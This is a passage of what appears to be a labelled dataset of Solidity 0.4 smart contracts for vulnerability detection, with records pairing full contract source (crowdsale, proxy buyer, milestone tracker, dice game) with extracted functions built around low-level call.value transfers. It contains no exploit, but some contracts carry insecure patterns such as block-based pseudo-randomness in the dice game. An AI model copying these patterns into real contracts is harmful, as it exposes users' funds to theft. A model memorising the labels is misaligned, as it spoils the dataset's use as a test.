memory self) internal constant returns (bool ret) { return self._unsafe_length == 0; } function isList(RLPItem memory self) internal constant returns (bool ret) { if (self._unsafe_length == 0) return false; uint memPtr = self._unsafe_memPtr; assembly { ret := iszero(lt(byte(0, mload(memPtr)), 0xC0)) } } function isData(RLPItem memory self) internal constant returns (bool ret) { if (self._unsafe_length == 0) return false; uint memPtr = self._unsafe_memPtr; assembly { ret := lt(byte(0, mload(memPtr)), 0xC0) } } function isEmpty(RLPItem memory self) internal constant returns (bool ret) { if(isNull(self)) return false; uint b0; uint memPtr = self._unsafe_memPtr; assembly { b0 := byte(0, mload(memPtr)) } return (b0 == DATA_SHORT_START || b0 == LIST_SHORT_START); } function items(RLPItem memory self) internal constant returns (uint) { if (!isList(self)) return 0; uint b0; uint memPtr = self._unsafe_memPtr; assembly { b0 := byte(0, mload(memPtr)) } uint pos = memPtr + _payloadOffset(self); uint last = memPtr + self._unsafe_length - 1; uint itms; while(pos <= last) { pos += _itemLength(pos); itms++; } return itms; } function iterator(RLPItem memory self) internal constant returns (Iterator memory it) { if (!isList(self)) throw; uint ptr = self._unsafe_memPtr + _payloadOffset(self); it._unsafe_item = self; it._unsafe_nextPtr = ptr; } function toBytes(RLPItem memory self) internal constant returns (bytes memory bts) { var len = self._unsafe_length; if (len == 0) return; bts = new bytes(len); _copyToBytes(self._unsafe_memPtr, bts, len); } function toData(RLPItem memory self) internal constant returns (bytes memory bts) { if(!isData(self)) throw; var (rStartPos, len) = _decode(self); bts = new bytes(len); _copyToBytes(rStartPos, bts, len); } function toList(RLPItem memory self) internal constant returns (RLPItem[] memory list) { if(!isList(self)) throw; var numItems = items(self); list = new RLPItem[](numItems); var it = iterator(self); uint idx; while(hasNext(it)) { list[idx] = next(it); idx++; } } function toAscii(RLPItem memory self) internal constant returns (string memory str) { if(!isData(self)) throw; var (rStartPos, len) = _decode(self); bytes memory bts = new bytes(len); _copyToBytes(rStartPos, bts, len); str = string(bts); } function toUint(RLPItem memory self) internal constant returns (uint data) { if(!isData(self)) throw; var (rStartPos, len) = _decode(self); if (len > 32 || len == 0) throw; assembly { data := div(mload(rStartPos), exp(256, sub(32, len))) } } function toBool(RLPItem memory self) internal constant returns (bool data) { if(!isData(self)) throw; var (rStartPos, len) = _decode(self); if (len != 1) throw; uint temp; assembly { temp := byte(0, mload(rStartPos)) } if (temp > 1) throw; return temp == 1 ? true : false; } function toByte(RLPItem memory self) internal constant returns (byte data) { if(!isData(self)) throw; var (rStartPos, len) = _decode(self); if (len != 1) throw; uint temp; assembly { temp := byte(0, mload(rStartPos)) } return byte(temp); } function toInt(RLPItem memory self) internal constant returns (int data) { return int(toUint(self)); } function toBytes32(RLPItem memory self) internal constant returns (bytes32 data) { return bytes32(toUint(self)); } function toAddress(RLPItem memory self) internal constant returns (address data) { if(!isData(self)) throw; var (rStartPos, len) = _decode(self); if (len != 20) throw; assembly { data := div(mload(rStartPos), exp(256, 12)) } } function _payloadOffset(RLPItem memory self) private constant returns (uint) { if(self._unsafe_length == 0) return 0; uint b0; uint memPtr = self._unsafe_memPtr; assembly { b0 := byte(0, mload(memPtr)) } if(b0 < DATA_SHORT_START) return 0; if(b0 < DATA_LONG_START || (b0 >= LIST_SHORT_START && b0 < LIST_LONG_START)) return 1; if(b0 < LIST_SHORT_START) return b0 - DATA_LONG_OFFSET + 1; return b0 - LIST_LONG_OFFSET + 1; } function _itemLength(uint memPtr) private constant returns (uint len) { uint b0; assembly { b0 := byte(0, mload(memPtr)) } if (b0 < DATA_SHORT_START) len = 1; else if (b0 < DATA_LONG_START) len = b0 - DATA_SHORT_START + 1; else if (b0 < LIST_SHORT_START) { assembly { let bLen := sub(b0, 0xB7) let dLen := div(mload(add(memPtr, 1)), exp(256, sub(32, bLen))) len := add(1, add(bLen, dLen)) } } else if (b0 < LIST_LONG_START) len = b0 - LIST_SHORT_START + 1; else { assembly { let bLen := sub(b0, 0xF7) let dLen := div(mload(add(memPtr, 1)), exp(256, sub(32, bLen))) len := add(1, add(bLen, dLen)) } } } function _decode(RLPItem memory self) private constant returns (uint memPtr, uint len) { if(!isData(self)) throw; uint b0; uint start = self._unsafe_memPtr; assembly { b0 := byte(0, mload(start)) } if (b0 < DATA_SHORT_START) { memPtr = start; len = 1; return; } if (b0 < DATA_LONG_START) { len = self._unsafe_length - 1; memPtr = start + 1; } else { uint bLen; assembly { bLen := sub(b0, 0xB7) } len = self._unsafe_length - 1 - bLen; memPtr = start + bLen + 1; } return; } function _copyToBytes(uint btsPtr, bytes memory tgt, uint btsLen) private constant { assembly { { let i := 0 let words := div(add(btsLen, 31), 32) let rOffset := btsPtr let wOffset := add(tgt, 0x20) tag_loop: jumpi(end, eq(i, words)) { let offset := mul(i, 0x20) mstore(add(wOffset, offset), mload(add(rOffset, offset))) i := add(i, 1) } jump(tag_loop) end: mstore(add(tgt, add(0x20, mload(tgt))), 0) } } } function _validate(RLPItem memory self) private constant returns (bool ret) { uint b0; uint b1; uint memPtr = self._unsafe_memPtr; assembly { b0 := byte(0, mload(memPtr)) b1 := byte(1, mload(memPtr)) } if(b0 == DATA_SHORT_START + 1 && b1 < DATA_SHORT_START) return false; return true; } } pragma solidity ^0.4.6; contract MilestoneTracker { using RLP for RLP.RLPItem; using RLP for RLP.Iterator; using RLP for bytes; struct Milestone { string description; string url; uint minCompletionDate; uint maxCompletionDate; address milestoneLeadLink; address reviewer; uint reviewTime; address paymentSource; bytes payData; MilestoneStatus status; uint doneTime; } Milestone[] public milestones; address public recipient; address public donor; address public arbitrator; enum MilestoneStatus { AcceptedAndInProgress, Completed, AuthorizedForPayment, Canceled } bool public campaignCanceled; bool public changingMilestones; bytes public proposedMilestones; modifier onlyRecipient { if (msg.sender !=  recipient) throw; _; } modifier onlyArbitrator { if (msg.sender != arbitrator) throw; _; } modifier onlyDonor { if (msg.sender != donor) throw; _; } modifier campaignNotCanceled { if (campaignCanceled) throw; _; } modifier notChanging { if (changingMilestones) throw; _; } event NewMilestoneListProposed(); event NewMilestoneListUnproposed(); event NewMilestoneListAccepted(); event ProposalStatusChanged(uint idProposal, MilestoneStatus newProposal); event CampaignCanceled(); function MilestoneTracker ( address _arbitrator, address _donor, address _recipient ) { arbitrator = _arbitrator; donor = _donor; recipient = _recipient; } function numberOfMilestones() constant returns (uint) { return milestones.length; } function changeArbitrator(address _newArbitrator) onlyArbitrator { arbitrator = _newArbitrator; } function changeDonor(address _newDonor) onlyDonor { donor = _newDonor; } function changeRecipient(address _newRecipient) onlyRecipient { recipient = _newRecipient; } function proposeMilestones(bytes _newMilestones ) onlyRecipient campaignNotCanceled { proposedMilestones = _newMilestones; changingMilestones = true; NewMilestoneListProposed(); } function unproposeMilestones() onlyRecipient campaignNotCanceled { delete proposedMilestones; changingMilestones = false; NewMilestoneListUnproposed(); } function acceptProposedMilestones(bytes32 _hashProposals ) onlyDonor campaignNotCanceled { uint i; if (!changingMilestones) throw; if (sha3(proposedMilestones) != _hashProposals) throw; for (i=0; i<milestones.length; i++) { if (milestones[i].status != MilestoneStatus.AuthorizedForPayment) { milestones[i].status = MilestoneStatus.Canceled; } } bytes memory mProposedMilestones = proposedMilestones; var itmProposals = mProposedMilestones.toRLPItem(true); if (!itmProposals.isList()) throw; var itrProposals = itmProposals.iterator(); while(itrProposals.hasNext()) { var itmProposal = itrProposals.next(); Milestone milestone = milestones[milestones.length ++]; if (!itmProposal.isList()) throw; var itrProposal = itmProposal.iterator(); milestone.description = itrProposal.next().toAscii(); milestone.url = itrProposal.next().toAscii(); milestone.minCompletionDate = itrProposal.next().toUint(); milestone.maxCompletionDate = itrProposal.next().toUint(); milestone.milestoneLeadLink = itrProposal.next().toAddress(); milestone.reviewer = itrProposal.next().toAddress(); milestone.reviewTime = itrProposal.next().toUint(); milestone.paymentSource = itrProposal.next().toAddress(); milestone.payData = itrProposal.next().toData(); milestone.status = MilestoneStatus.AcceptedAndInProgress; } delete proposedMilestones; changingMilestones = false; NewMilestoneListAccepted(); } function markMilestoneComplete(uint _idMilestone)campaignNotCanceled notChanging   { if (_idMilestone >= milestones.length) throw; Milestone milestone = milestones[_idMilestone]; if (  (msg.sender != milestone.milestoneLeadLink)&&(msg.sender != recipient)) throw; if (milestone.status != MilestoneStatus.AcceptedAndInProgress) throw; if (now < milestone.minCompletionDate) throw; if (now > milestone.maxCompletionDate) throw; milestone.status = MilestoneStatus.Completed; milestone.doneTime = now; ProposalStatusChanged(_idMilestone, milestone.status); } function approveCompletedMilestone(uint _idMilestone) campaignNotCanceled notChanging { if (_idMilestone >= milestones.length) throw; Milestone milestone = milestones[_idMilestone]; if ((msg.sender != milestone.reviewer) ||(milestone.status != MilestoneStatus.Completed)) throw; authorizePayment(_idMilestone); } function rejectMilestone(uint _idMilestone) campaignNotCanceled notChanging { if (_idMilestone >= milestones.length) throw; Milestone milestone = milestones[_idMilestone]; if ((msg.sender != milestone.reviewer) || (milestone.status != MilestoneStatus.Completed)) throw; milestone.status = MilestoneStatus.AcceptedAndInProgress; ProposalStatusChanged(_idMilestone, milestone.status); } function requestMilestonePayment(uint _idMilestone) campaignNotCanceled notChanging { if (_idMilestone >= milestones.length) throw; Milestone milestone = milestones[_idMilestone]; if ((msg.sender != milestone.milestoneLeadLink)&&(msg.sender != recipient))  throw; if ((milestone.status != MilestoneStatus.Completed) || (now < milestone.doneTime + milestone.reviewTime)) throw; authorizePayment(_idMilestone); } function cancelMilestone(uint _idMilestone) onlyRecipient campaignNotCanceled notChanging { if (_idMilestone >= milestones.length) throw; Milestone milestone = milestones[_idMilestone]; if  ((milestone.status != MilestoneStatus.AcceptedAndInProgress) && (milestone.status != MilestoneStatus.Completed)) throw; milestone.status = MilestoneStatus.Canceled; ProposalStatusChanged(_idMilestone, milestone.status); } function arbitrateApproveMilestone(uint _idMilestone) onlyArbitrator campaignNotCanceled notChanging { if (_idMilestone >= milestones.length) throw; Milestone milestone = milestones[_idMilestone]; if ((milestone.status != MilestoneStatus.AcceptedAndInProgress) && (milestone.status != MilestoneStatus.Completed)) throw; authorizePayment(_idMilestone); } function arbitrateCancelCampaign() onlyArbitrator campaignNotCanceled { campaignCanceled = true; CampaignCanceled(); } function authorizePayment(uint _idMilestone) internal { if (_idMilestone >= milestones.length) throw; Milestone milestone = milestones[_idMilestone]; if (milestone.status == MilestoneStatus.AuthorizedForPayment) throw; milestone.status = MilestoneStatus.AuthorizedForPayment; if(!milestone.paymentSource.call.value(0)(milestone.payData)) throw; ProposalStatusChanged(_idMilestone, milestone.status); } } "}
{"sol name": "35661.sol", "label": 0, "first path": "function refund() stopInEmergency { if(getState() != State.Refunding) throw; address investor = msg.sender; if(balances[investor] == 0) throw; uint amount = balances[investor]; delete balances[investor]; if(!(investor.call.value(amount)())) throw; Refunded(investor, amount); ", "second path": "function refund() stopInEmergency { if(getState() != State.Refunding) throw; address investor = msg.sender; if(balances[investor] == 0) throw; uint amount = balances[investor]; delete balances[investor]; if(!(investor.call.value(amount)())) throw; Refunded(investor, amount); ", "third path": "function refund() stopInEmergency { if(getState() != State.Refunding) throw; address investor = msg.sender; if(balances[investor] == 0) throw; uint amount = balances[investor]; delete balances[investor]; if(!(investor.call.value(amount)())) throw; Refunded(investor, amount); ", "long path": "contract SafeMath { function safeMul(uint a, uint b) internal returns (uint) { uint c = a * b; assert(a == 0 || c / a == b); return c; } function safeDiv(uint a, uint b) internal returns (uint) { assert(b > 0); uint c = a / b; assert(a == b * c + a % b); return c; } function safeSub(uint a, uint b) internal returns (uint) { assert(b <= a); return a - b; } function safeAdd(uint a, uint b) internal returns (uint) { uint c = a + b; assert(c>=a && c>=b); return c; } function max64(uint64 a, uint64 b) internal constant returns (uint64) { return a >= b ? a : b; } function min64(uint64 a, uint64 b) internal constant returns (uint64) { return a < b ? a : b; } function max256(uint256 a, uint256 b) internal constant returns (uint256) { return a >= b ? a : b; } function min256(uint256 a, uint256 b) internal constant returns (uint256) { return a < b ? a : b; } } library SafeMathLib { function times(uint a, uint b) returns (uint) { uint c = a * b; assert(a == 0 || c / a == b); return c; } function minus(uint a, uint b) returns (uint) { assert(b <= a); return a - b; } function plus(uint a, uint b) returns (uint) { uint c = a + b; assert(c>=a); return c; } } contract Ownable { address public owner; event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); function Ownable() { owner = msg.sender; } modifier onlyOwner() { require(msg.sender == owner); _; } function transferOwnership(address newOwner) onlyOwner public { require(newOwner != address(0)); OwnershipTransferred(owner, newOwner); owner = newOwner; } } contract Haltable is Ownable { bool public halted; modifier stopInEmergency { if (halted) throw; _; } modifier stopNonOwnersInEmergency { if (halted && msg.sender != owner) throw; _; } modifier onlyInEmergency { if (!halted) throw; _; } function halt() external onlyOwner { halted = true; } function unhalt() external onlyOwner onlyInEmergency { halted = false; } } contract PricingStrategy { function isPricingStrategy() public constant returns (bool) { return true; } function isSane(address crowdsale) public constant returns (bool) { return true; } function isPresalePurchase(address purchaser) public constant returns (bool) { return false; } function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount); } contract FinalizeAgent { function isFinalizeAgent() public constant returns(bool) { return true; } function isSane() public constant returns (bool); function finalizeCrowdsale(); } contract ERC20Basic { uint256 public totalSupply; function balanceOf(address who) public constant returns (uint256); function transfer(address to, uint256 value) public returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); } contract ERC20 is ERC20Basic { function allowance(address owner, address spender) public constant returns (uint256); function transferFrom(address from, address to, uint256 value) public returns (bool); function approve(address spender, uint256 value) public returns (bool); event Approval(address indexed owner, address indexed spender, uint256 value); } contract FractionalERC20 is ERC20 { uint public decimals; } contract Crowdsale is Haltable { uint public MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE = 5; using SafeMathLib for uint; FractionalERC20 public token; PricingStrategy public pricingStrategy; FinalizeAgent public finalizeAgent; address public multisigWallet; uint public minimumFundingGoal; uint public startsAt; uint public endsAt; uint public tokensSold = 0; uint public weiRaised = 0; uint public presaleWeiRaised = 0; uint public investorCount = 0; uint public loadedRefund = 0; uint public weiRefunded = 0; bool public finalized; bool public requireCustomerId; bool public requiredSignedAddress; address public signerAddress; mapping (address => uint256) public investedAmountOf; mapping (address => uint256) public tokenAmountOf; mapping (address => bool) public earlyParticipantWhitelist; uint public ownerTestValue; enum State{Unknown, Preparing, PreFunding, Funding, Success, Failure, Finalized, Refunding} event Invested(address investor, uint weiAmount, uint tokenAmount, uint128 customerId); event Refund(address investor, uint weiAmount); event InvestmentPolicyChanged(bool newRequireCustomerId, bool newRequiredSignedAddress, address newSignerAddress); event Whitelisted(address addr, bool status); event EndsAtChanged(uint newEndsAt); function Crowdsale(address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal) { owner = msg.sender; token = FractionalERC20(_token); setPricingStrategy(_pricingStrategy); multisigWallet = _multisigWallet; if(multisigWallet == 0) { throw; } if(_start == 0) { throw; } startsAt = _start; if(_end == 0) { throw; } endsAt = _end; if(startsAt >= endsAt) { throw; } minimumFundingGoal = _minimumFundingGoal; } function() payable { throw; } function investInternal(address receiver, uint128 customerId) stopInEmergency private { if(getState() == State.PreFunding) { if(!earlyParticipantWhitelist[receiver]) { throw; } } else if(getState() == State.Funding) { } else { throw; } uint weiAmount = msg.value; uint tokenAmount = pricingStrategy.calculatePrice(weiAmount, weiRaised - presaleWeiRaised, tokensSold, msg.sender, token.decimals()); if(tokenAmount == 0) { throw; } if(investedAmountOf[receiver] == 0) { investorCount++; } investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount); tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount); weiRaised = weiRaised.plus(weiAmount); tokensSold = tokensSold.plus(tokenAmount); if(pricingStrategy.isPresalePurchase(receiver)) { presaleWeiRaised = presaleWeiRaised.plus(weiAmount); } if(isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold)) { throw; } assignTokens(receiver, tokenAmount); if(!multisigWallet.send(weiAmount)) throw; Invested(receiver, weiAmount, tokenAmount, customerId); } function preallocate(address receiver, uint fullTokens, uint weiPrice) public onlyOwner { uint tokenAmount = fullTokens * 10**token.decimals(); uint weiAmount = weiPrice * fullTokens; weiRaised = weiRaised.plus(weiAmount); tokensSold = tokensSold.plus(tokenAmount); investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount); tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount); assignTokens(receiver, tokenAmount); Invested(receiver, weiAmount, tokenAmount, 0); } function investWithSignedAddress(address addr, uint128 customerId, uint8 v, bytes32 r, bytes32 s) public payable { bytes32 hash = sha256(addr); if (ecrecover(hash, v, r, s) != signerAddress) throw; if(customerId == 0) throw; investInternal(addr, customerId); } function investWithCustomerId(address addr, uint128 customerId) public payable { if(requiredSignedAddress) throw; if(customerId == 0) throw; investInternal(addr, customerId); } function invest(address addr) public payable { if(requireCustomerId) throw; if(requiredSignedAddress) throw; investInternal(addr, 0); } function buyWithSignedAddress(uint128 customerId, uint8 v, bytes32 r, bytes32 s) public payable { investWithSignedAddress(msg.sender, customerId, v, r, s); } function buyWithCustomerId(uint128 customerId) public payable { investWithCustomerId(msg.sender, customerId); } function buy() public payable { invest(msg.sender); } function finalize() public inState(State.Success) onlyOwner stopInEmergency { if(finalized) { throw; } if(address(finalizeAgent) != 0) { finalizeAgent.finalizeCrowdsale(); } finalized = true; } function setFinalizeAgent(FinalizeAgent addr) onlyOwner { finalizeAgent = addr; if(!finalizeAgent.isFinalizeAgent()) { throw; } } function setRequireCustomerId(bool value) onlyOwner { requireCustomerId = value; InvestmentPolicyChanged(requireCustomerId, requiredSignedAddress, signerAddress); } function setRequireSignedAddress(bool value, address _signerAddress) onlyOwner { requiredSignedAddress = value; signerAddress = _signerAddress; InvestmentPolicyChanged(requireCustomerId, requiredSignedAddress, signerAddress); } function setEarlyParicipantWhitelist(address addr, bool status) onlyOwner { earlyParticipantWhitelist[addr] = status; Whitelisted(addr, status); } function setEndsAt(uint time) onlyOwner { if(now > time) { throw; } endsAt = time; EndsAtChanged(endsAt); } function setPricingStrategy(PricingStrategy _pricingStrategy) onlyOwner { pricingStrategy = _pricingStrategy; if(!pricingStrategy.isPricingStrategy()) { throw; } } function setMultisig(address addr) public onlyOwner { if(investorCount > MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE) { throw; } multisigWallet = addr; } function loadRefund() public payable inState(State.Failure) { if(msg.value == 0) throw; loadedRefund = loadedRefund.plus(msg.value); } function refund() public inState(State.Refunding) { uint256 weiValue = investedAmountOf[msg.sender]; if (weiValue == 0) throw; investedAmountOf[msg.sender] = 0; weiRefunded = weiRefunded.plus(weiValue); Refund(msg.sender, weiValue); if (!msg.sender.send(weiValue)) throw; } function isMinimumGoalReached() public constant returns (bool reached) { return weiRaised >= minimumFundingGoal; } function isFinalizerSane() public constant returns (bool sane) { return finalizeAgent.isSane(); } function isPricingSane() public constant returns (bool sane) { return pricingStrategy.isSane(address(this)); } function getState() public constant returns (State) { if(finalized) return State.Finalized; else if (address(finalizeAgent) == 0) return State.Preparing; else if (!finalizeAgent.isSane()) return State.Preparing; else if (!pricingStrategy.isSane(address(this))) return State.Preparing; else if (block.timestamp < startsAt) return State.PreFunding; else if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding; else if (isMinimumGoalReached()) return State.Success; else if (!isMinimumGoalReached() && weiRaised > 0 && loadedRefund >= weiRaised) return State.Refunding; else return State.Failure; } function setOwnerTestValue(uint val) onlyOwner { ownerTestValue = val; } function isCrowdsale() public constant returns (bool) { return true; } modifier inState(State state) { if(getState() != state) throw; _; } function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) constant returns (bool limitBroken); function isCrowdsaleFull() public constant returns (bool); function assignTokens(address receiver, uint tokenAmount) private; } contract StandardToken is ERC20, SafeMath { event Minted(address receiver, uint amount); mapping(address => uint) balances; mapping (address => mapping (address => uint)) allowed; function isToken() public constant returns (bool weAre) { return true; } function transfer(address _to, uint _value) returns (bool success) { balances[msg.sender] = safeSub(balances[msg.sender], _value); balances[_to] = safeAdd(balances[_to], _value); Transfer(msg.sender, _to, _value); return true; } function transferFrom(address _from, address _to, uint _value) returns (bool success) { uint _allowance = allowed[_from][msg.sender]; balances[_to] = safeAdd(balances[_to], _value); balances[_from] = safeSub(balances[_from], _value); allowed[_from][msg.sender] = safeSub(_allowance, _value); Transfer(_from, _to, _value); return true; } function balanceOf(address _owner) constant returns (uint balance) { return balances[_owner]; } function approve(address _spender, uint _value) returns (bool success) { if ((_value != 0) && (allowed[msg.sender][_spender] != 0)) throw; allowed[msg.sender][_spender] = _value; Approval(msg.sender, _spender, _value); return true; } function allowance(address _owner, address _spender) constant returns (uint remaining) { return allowed[_owner][_spender]; } } contract PreICOProxyBuyer is Ownable, Haltable, SafeMath { uint public investorCount; uint public weiRaised; address[] public investors; mapping(address => uint) public balances; mapping(address => uint) public claimed; uint public freezeEndsAt; uint public weiMinimumLimit; uint public weiMaximumLimit; uint public weiCap; uint public tokensBought; uint public claimCount; uint public totalClaimed; bool public forcedRefund; Crowdsale public crowdsale; enum State{Unknown, Funding, Distributing, Refunding} event Invested(address investor, uint weiAmount, uint tokenAmount, uint128 customerId); event Refunded(address investor, uint value); event TokensBoughts(uint count); event Distributed(address investor, uint count); function PreICOProxyBuyer(address _owner, uint _freezeEndsAt, uint _weiMinimumLimit, uint _weiMaximumLimit, uint _weiCap) { owner = _owner; if(_freezeEndsAt == 0) { throw; } if(_weiMinimumLimit == 0) { throw; } if(_weiMaximumLimit == 0) { throw; } weiMinimumLimit = _weiMinimumLimit; weiMaximumLimit = _weiMaximumLimit; weiCap = _weiCap; freezeEndsAt = _freezeEndsAt; } function getToken() public constant returns(FractionalERC20) { if(address(crowdsale) == 0)  { throw; } return crowdsale.token(); } function invest(uint128 customerId) private { if(getState() != State.Funding) throw; if(msg.value == 0) throw; address investor = msg.sender; bool existing = balances[investor] > 0; balances[investor] = safeAdd(balances[investor], msg.value); if(balances[investor] < weiMinimumLimit || balances[investor] > weiMaximumLimit) { throw; } if(!existing) { investors.push(investor); investorCount++; } weiRaised = safeAdd(weiRaised, msg.value); if(weiRaised > weiCap) { throw; } Invested(investor, msg.value, 0, customerId); } function buyWithCustomerId(uint128 customerId) public stopInEmergency payable { invest(customerId); } function buy() public stopInEmergency payable { invest(0x0); } function buyForEverybody() stopNonOwnersInEmergency public { if(getState() != State.Funding) { throw; } if(address(crowdsale) == 0) throw; crowdsale.invest.value(weiRaised)(address(this)); tokensBought = getToken().balanceOf(address(this)); if(tokensBought == 0) { throw; } TokensBoughts(tokensBought); } function getClaimAmount(address investor) public constant returns (uint) { if(getState() != State.Distributing) { throw; } return safeMul(balances[investor], tokensBought) / weiRaised; } function getClaimLeft(address investor) public constant returns (uint) { return safeSub(getClaimAmount(investor), claimed[investor]); } function claimAll() { claim(getClaimLeft(msg.sender)); } function claim(uint amount) stopInEmergency { address investor = msg.sender; if(amount == 0) { throw; } if(getClaimLeft(investor) < amount) { throw; } if(claimed[investor] == 0) { claimCount++; } claimed[investor] = safeAdd(claimed[investor], amount); totalClaimed = safeAdd(totalClaimed, amount); getToken().transfer(investor, amount); Distributed(investor, amount); } function refund() stopInEmergency { if(getState() != State.Refunding) throw; address investor = msg.sender; if(balances[investor] == 0) throw; uint amount = balances[investor]; delete balances[investor]; if(!(investor.call.value(amount)())) throw; Refunded(investor, amount); } function setCrowdsale(Crowdsale _crowdsale) public onlyOwner { crowdsale = _crowdsale; if(!crowdsale.isCrowdsale()) true; } function forceRefund() public onlyOwner { forcedRefund = true; } function loadRefund() public payable { if(getState() != State.Refunding) throw; } function getState() public returns(State) { if (forcedRefund) return State.Refunding; if(tokensBought == 0) { if(now >= freezeEndsAt) { return State.Refunding; } else { return State.Funding; } } else { return State.Distributing; } } function isPresale() public constant returns (bool) { return true; } function() payable { throw; } } "}
{"sol name": "35649.sol", "label": 0, "first path": "function playerWithdrawPendingTransactions() public  payoutsAreActive   returns (bool)  { uint withdrawAmount = playerPendingWithdrawals[msg.sender]; playerPendingWithdrawals[msg.sender] = 0; if (msg.sender.call.value(withdrawAmount)()) { return true; } else { playerPendingWithdrawals[msg.sender] = withdrawAmount; return false; ", "second path": "function playerWithdrawPendingTransactions() public  payoutsAreActive   returns (bool)  { uint withdrawAmount = playerPendingWithdrawals[msg.sender]; playerPendingWithdrawals[msg.sender] = 0; if (msg.sender.call.value(withdrawAmount)()) { return true; } else { playerPendingWithdrawals[msg.sender] = withdrawAmount; return false; ", "third path": "function playerWithdrawPendingTransactions() public  payoutsAreActive   returns (bool)  { uint withdrawAmount = playerPendingWithdrawals[msg.sender]; playerPendingWithdrawals[msg.sender] = 0; if (msg.sender.call.value(withdrawAmount)()) { return true; } else { playerPendingWithdrawals[msg.sender] = withdrawAmount; return false; ", "long path": "pragma solidity ^0.4.2; contract DSSafeAddSub { function safeToAdd(uint a, uint b) internal returns (bool) { return (a + b >= a); } function safeAdd(uint a, uint b) internal returns (uint) { require(safeToAdd(a, b)); return a + b; } function safeToSubtract(uint a, uint b) internal returns (bool) { return (b <= a); } function safeSub(uint a, uint b) internal returns (uint) { require(safeToSubtract(a, b)); return a - b; } } contract MyDice is DSSafeAddSub { modifier betIsValid(uint _betSize, uint _playerNumber) { require(((((_betSize * (10000-(safeSub(_playerNumber,1)))) / (safeSub(_playerNumber,1))+_betSize))*houseEdge/houseEdgeDivisor)-_betSize <= maxProfit); require(_playerNumber < maxNumber); require(_betSize >= minBet); _; } modifier gameIsActive { require(gamePaused == false); _; } modifier payoutsAreActive { require(payoutsPaused == false); _; } modifier onlyOwner { require(msg.sender == owner); _; } uint constant public maxBetDivisor = 1000000; uint constant public houseEdgeDivisor = 1000; bool public gamePaused; address public owner; bool public payoutsPaused; uint public contractBalance; uint public houseEdge; uint public maxProfit; uint public maxProfitAsPercentOfHouse; uint public minBet; uint public totalBets; uint public totalUserProfit; uint private randomNumber; uint private maxNumber = 10000; uint private underNumber = 5000; struct Bet { address bettorAddress; uint    betSize; uint    betID; } uint public numElements = 0; Bet[] pendingBets; mapping (address => uint) playerPendingWithdrawals; event LogBetStart(uint indexed betID); event LogResult(uint indexed BetID, address indexed PlayerAddress, uint indexed PlayerNumber, uint DiceResult, uint Value, int Status,uint BetValue,uint targetNumber); event LogOwnerTransfer(address indexed SentToAddress, uint indexed AmountTransferred); function MyDice() { owner = msg.sender; ownerSetHouseEdge(935); ownerSetMaxProfitAsPercentOfHouse(20000); ownerSetMinBet(20000000000000000); } function GetRandomNumber(uint32 seed) internal returns(uint randomNum) { randomNumber = randomNumber % block.timestamp + uint256(block.blockhash(block.number - 1)); randomNumber = randomNumber + block.timestamp * block.difficulty * block.number + 1; randomNumber = uint(sha3(randomNumber,seed)); return (maxNumber - randomNumber % maxNumber); } function StartRollDice(uint32 seed) public gameIsActive onlyOwner { if(numElements == 0) return; uint i = numElements - 1; uint randResult = GetRandomNumber(seed); if(randResult < underNumber){ uint playerProfit = ((((pendingBets[i].betSize * (maxNumber-(safeSub(underNumber,1)))) / (safeSub(underNumber,1))+pendingBets[i].betSize))*houseEdge/houseEdgeDivisor)-pendingBets[i].betSize; contractBalance = safeSub(contractBalance, playerProfit); uint reward = safeAdd(playerProfit, pendingBets[i].betSize); totalUserProfit = totalUserProfit + playerProfit; LogResult(pendingBets[i].betID, pendingBets[i].bettorAddress, underNumber, randResult, reward, 1, pendingBets[i].betSize,underNumber); setMaxProfit(); if(!pendingBets[i].bettorAddress.send(reward)){ LogResult(pendingBets[i].betID, pendingBets[i].bettorAddress, underNumber, randResult, reward, 2, pendingBets[i].betSize,underNumber); playerPendingWithdrawals[pendingBets[i].bettorAddress] = safeAdd(playerPendingWithdrawals[pendingBets[i].bettorAddress], reward); } numElements -= 1; return; } if(randResult >= underNumber){ LogResult(pendingBets[i].betID, pendingBets[i].bettorAddress, underNumber, randResult, pendingBets[i].betSize, 0, pendingBets[i].betSize,underNumber); contractBalance = safeAdd(contractBalance, pendingBets[i].betSize-1); setMaxProfit(); if(!pendingBets[i].bettorAddress.send(1)){ playerPendingWithdrawals[pendingBets[i].bettorAddress] = safeAdd(playerPendingWithdrawals[pendingBets[i].bettorAddress], 1); } numElements -= 1; return; } } function playerRollDice() public payable gameIsActive betIsValid(msg.value, underNumber) { totalBets++; Bet memory b = Bet(msg.sender,msg.value,totalBets); if(numElements == pendingBets.length) { pendingBets.length += 1; } pendingBets[numElements++] = b; LogBetStart(totalBets); } function playerWithdrawPendingTransactions() public  payoutsAreActive   returns (bool)  { uint withdrawAmount = playerPendingWithdrawals[msg.sender]; playerPendingWithdrawals[msg.sender] = 0; if (msg.sender.call.value(withdrawAmount)()) { return true; } else { playerPendingWithdrawals[msg.sender] = withdrawAmount; return false; } } function playerGetPendingTxByAddress(address addressToCheck) public constant returns (uint) { return playerPendingWithdrawals[addressToCheck]; } function setMaxProfit() internal { maxProfit = (contractBalance*maxProfitAsPercentOfHouse)/maxBetDivisor; } function () payable { playerRollDice(); } function ownerAddBankroll() payable onlyOwner { contractBalance = safeAdd(contractBalance, msg.value); setMaxProfit(); } function getcontractBalance() public onlyOwner returns(uint) { return contractBalance; } function ownerSetHouseEdge(uint newHouseEdge) public onlyOwner { houseEdge = newHouseEdge; } function getHouseEdge() public onlyOwner returns(uint) { return houseEdge; } function ownerSetMaxProfitAsPercentOfHouse(uint newMaxProfitAsPercent) public onlyOwner { require(newMaxProfitAsPercent <= 50000); maxProfitAsPercentOfHouse = newMaxProfitAsPercent; setMaxProfit(); } function getMaxProfitAsPercentOfHouse() public onlyOwner returns(uint) { return maxProfitAsPercentOfHouse; } function 